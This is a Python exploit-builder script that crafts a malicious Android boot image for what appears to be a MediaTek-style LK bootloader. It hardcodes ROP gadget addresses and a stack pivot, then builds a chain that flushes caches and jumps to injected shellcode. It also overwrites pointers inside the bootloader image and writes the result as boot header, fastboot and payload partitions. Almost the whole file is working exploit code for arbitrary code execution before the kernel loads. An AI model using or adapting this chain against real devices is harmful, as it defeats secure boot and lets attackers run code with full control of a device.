#!/usr/bin/env python3
import sys
import struct

base = 0x4BD00000
forced_addr = 0x45000000

# b5a4:       e8bdd1df        pop     {r0, r1, r2, r3, r4, r6, r7, r8, ip, lr, pc}
pop_r0_r1_r2_r3_r4_r6_r7_r8_ip_lr_pc = base + 0xb5a4

# 249b8:       bd00            pop     {pc}
pop_pc = base + 0x249b8|1

# 150:       4798            blx     r3 ; pop {r3, pc}
blx_r3_pop_r3 = base + 0x150|1

cache_func = base + 0x31444

test = base + 0x185 # prints "Error, the pointer of pidme_data is NULL."

shellcode_sz = 0x1000 # TODO: check size

lk_offset = base - forced_addr

#inject_offset = 0x1000000
inject_offset = lk_offset - shellcode_sz - 0x100

inject_addr = forced_addr + inject_offset + 0x10
shellcode_addr = forced_addr + inject_offset + 0x100

# 3088:       0913f04f        ldmdbeq r3, {r0, r1, r2, r3, r6, ip, sp, lr, pc}
pivot = base + 0x3088;

ptr_offset = 0x3C0

r3_pc = base + (ptr_offset - 0x18) 
ptr_pc = base + (ptr_offset - 0x08)

lk_r3_target = inject_addr + 0x10
lk_ptr_target = inject_addr + 0x14


def main():
    if len(sys.argv) < 2:
        args = ["", "../bin/lk.bin", "build/payload.bin", "../bin/boot.hdr", "../bin/boot.payload" ]
    elif len(sys.argv) < 3:
        args = ["", "../bin/lk.bin", "build/payload.bin", sys.argv[1] ]
    elif len(sys.argv) < 4:
        args = ["", "../bin/lk.bin", "build/payload.bin", sys.argv[1], sys.argv[2] ]
    else:
        args = sys.argv

    with open(args[1], "rb") as fin:
        orig = fin.read(ptr_offset + 0x200)
        fin.seek(ptr_offset + 0x200 + 0x8)
        pad_len = ((len(orig) // 0x200) + 1) * 0x200
        orig2 = fin.read(pad_len - len(orig) - 0x8)

    hdr = bytes.fromhex("414E44524F494421")
    hdr += struct.pack("<II", lk_offset + ptr_offset + 0x8, forced_addr)
    hdr += bytes.fromhex("0000000000000044000000000000F0400000004840000000000000002311040E00000000000000000000000000000000")
    hdr += b"bootopt=64S3,32N2,32N2" # This is so that TZ still inits, but LK thinks kernel is 32-bit - need to fix too!
    hdr += b"\x00" * 0xA
    hdr += b"\x00" * inject_offset
    hdr += struct.pack("<II", inject_addr + 0x40, pivot) # r3, pc (+0x40 because gadget arg points at the end of ldm package)
    hdr += b"\x00" * 0x1C
    hdr += struct.pack("<III", inject_addr + 0x50, 0, pop_pc) # sp, lr, pc

    hdr += b"\x00" * (0xC + 0x4)

    # clean dcache, flush icache, then jump to payload
    chain = [
        pop_r0_r1_r2_r3_r4_r6_r7_r8_ip_lr_pc,
        shellcode_addr,                              # r0
        shellcode_sz,                                # r1
        0xDEAD,                                      # r2
        cache_func,                                  # r3
        0xDEAD,                                      # r4
        0xDEAD,                                      # r6
        0xDEAD,                                      # r7
        0xDEAD,                                      # r8
        0xDEAD,                                      # ip
        0xDEAD,                                      # lr

        blx_r3_pop_r3,                               # pc
        0xDEAD,                                      # r3

        shellcode_addr                               # pc
    ]
    chain_bin = b"".join([struct.pack("<I", word) for word in chain])
    hdr += chain_bin

    want_len = shellcode_addr - inject_addr + 0x40 + 0x10
    hdr += b"\x00" * ((want_len + inject_offset) - len(hdr))

    with open(args[2], "rb") as fin:
        shellcode = fin.read()

    if len(shellcode) > shellcode_sz:
        raise RuntimeError("shellcode too big!")

    hdr += shellcode

    hdr += b"\x00" * (lk_offset + 0x40 - len(hdr) - 0x200)

    hdr += orig
    hdr += struct.pack("<ii", lk_r3_target - r3_pc, lk_ptr_target - ptr_pc)
    hdr += orig2

    payload_block = (inject_offset // 0x200)
    print("Payload Address: " + hex(shellcode_addr))
    print("Payload Block:   " + str(payload_block))
    print("Part Size:       %d ( %.2f MiB / %d Blocks)" % (len(hdr), len(hdr)/1024/1024, (len(hdr)//0x200) + 1))
    if len(args) > 4:
        print("Writing " + args[3] + "...")
        with open(args[3], "wb") as fout:
            fout.write(hdr[:0x60])
        print("Writing " + args[3] + ".fb...")
        with open(args[3] + ".fb", "wb") as fout:
            fout.write(hdr[:0x60])
            fout.write("FASTBOOT_PLEASE\0".encode('utf-8'))
        print("Writing " + args[4] + "...")
        with open(args[4], "wb") as fout:
            fout.write(hdr[payload_block * 0x200:])
    else:
        print("Writing " + args[3] + "...")
        with open(args[3], "wb") as fout:
            fout.write(hdr)


if __name__ == "__main__":
    main()
